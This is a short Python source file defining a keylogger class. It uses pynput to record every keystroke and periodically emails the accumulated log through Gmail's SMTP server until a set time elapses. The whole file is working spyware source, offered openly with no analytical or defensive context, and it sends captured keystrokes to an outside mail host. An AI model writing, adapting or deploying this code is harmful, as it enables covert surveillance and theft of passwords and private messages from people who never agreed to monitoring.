from pynput import keyboard
import threading
import smtplib, datetime, sys

# ========================================================
#   KEY LOGGER CLASS WHICH STORES/SENDS KEYLOGS TO EMAIL
# ========================================================
class KeyLogger:

    # ----------------------------------------------------------------------------------------------
    #   INITAITE CONSTRUCTOR USING EMAIL, PASSWORD AND MAIL TIME INTERVAL ALONG WITH INTERRUPT TIME
    # ----------------------------------------------------------------------------------------------
    def __init__(self, email, password, time_interval, terminate):
        self.log = ''
        self.email = email
        self.password = password
        self.time_interval = time_interval
        self.terminate = terminate
        self.pasttime = datetime.datetime.now()
        self.keyboard_listener = keyboard.Listener(on_press=self.process_on_key)

    # -----------------------------------------------------
    #   THIS METHOD ACTIVATE WHEN USE CLICK ANY OF THE KEY
    # -----------------------------------------------------
    def process_on_key(self, key):
        try:
            self.log = self.log + str(key.char)
        except:
            if str(key) == 'Key.space':
                self.log = self.log + ' '
            else:
                self.log = self.log + str(key)

    # ---------------------------------------
    #   SEND KEY LOGS IN MAIL
    # ---------------------------------------
    def send_mail(self, email, password, res):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, res)

    # --------------------------------------------------------
    #   CREATE A REPORT TO SEND LOGS BASED ON TIME INTERVAL
    # --------------------------------------------------------
    def report(self):
        present_time = datetime.datetime.now()
        diff_time = (present_time - self.pasttime).seconds
        if diff_time >= self.terminate:
            self.keyboard_listener.stop()
            sys.exit(0)
        else:
            self.send_mail(self.email, self.password, self.log)
            self.log = ''
            timer = threading.Timer(self.time_interval, self.report)
            timer.start()

    # -------------------------------------------------
    #   MAIN METHOD TO CALL KEYBOARD LISTENTER THERAD
    # -------------------------------------------------
    def run(self):
        self.keyboard_listener.start()
        self.report()

